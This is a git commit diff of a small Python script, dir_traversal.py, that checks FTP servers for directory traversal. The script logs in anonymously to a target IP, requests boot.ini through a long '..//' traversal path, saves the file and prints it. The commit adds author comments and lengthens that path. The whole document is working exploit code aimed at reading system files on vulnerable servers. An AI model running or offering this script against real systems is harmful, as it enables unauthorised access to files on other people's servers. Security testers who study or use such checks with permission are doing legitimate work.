8681b6766e2c0aa0b40691e70e35532fda62ed3b
JT <shipcodez@gmail.com>
2016-01-12 14:04:16 +0800

    Update dir_traversal.py

--- ftp/dir_traversal.py
+++ ftp/dir_traversal.py
@@ -1,8 +1,11 @@
+# dir_traversal.py allows you to check FTP directory traversal vulnerability
+# author : @shipcod3
+
 from ftplib import FTP
  
 ftp = FTP(raw_input("Target IP: ")) 
 ftp.login()                   
-ftp.retrbinary('RETR ..//..//..//..//..//..//..//..//..//..//..//boot.ini', open('boot.ini.txt', 'wb').write)
+ftp.retrbinary('RETR ..//..//..//..//../..//..//..//..//..//..//..//..//..//..//..//..//boot.ini', open('boot.ini.txt', 'wb').write)
 ftp.close()
 file = open('boot.ini.txt', 'r')
 print "[**] Printing what's inside boot.ini\n"
